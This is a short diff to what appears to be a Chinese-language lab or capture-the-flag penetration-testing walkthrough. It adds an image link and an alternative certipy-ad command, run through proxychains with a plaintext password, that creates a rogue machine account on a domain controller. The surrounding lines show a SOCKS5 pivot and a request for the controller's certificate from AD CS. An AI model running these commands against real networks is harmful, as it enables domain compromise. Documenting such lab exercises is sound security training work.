@@ -686,6 +686,9 @@ confluence_ichunqiu_2022
 ```
 .\update.exe -L socks5://0.0.0.0:1080
 ```
+
+![](assets/file-20260603142937825.png)
+
 ### SMB 扫描该网段的 Windows 主机：
 
 必须使用 `PROXYCHAINS_CONF_FILE` 环境变量指定 `proxychains4-24.conf`（对应 `6001` 端口，通往 `172.24.7.0/24`）。
@@ -758,6 +761,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
                                           RestrictedKrbHost/EVILCOMPUTER1
     dnsHostName                         : DC.pentest.me
 [*] Successfully created account 'EVILCOMPUTER1$' with password '123@#ABC'
+
+#或者这个用法
+☁  endless  proxychains4 -f /etc/proxychains4-24.conf   -q certipy-ad account create -u usera@pentest.me -p Admin3gv83 -dc-ip 172.24.7.3 -user 'EVILCOMPUTER1$' -pass '123@#ABC' -dns 'DC.pentest.me' 
 ```
 
 使用该机器账户向 ADCS 服务器请求域控的证书：
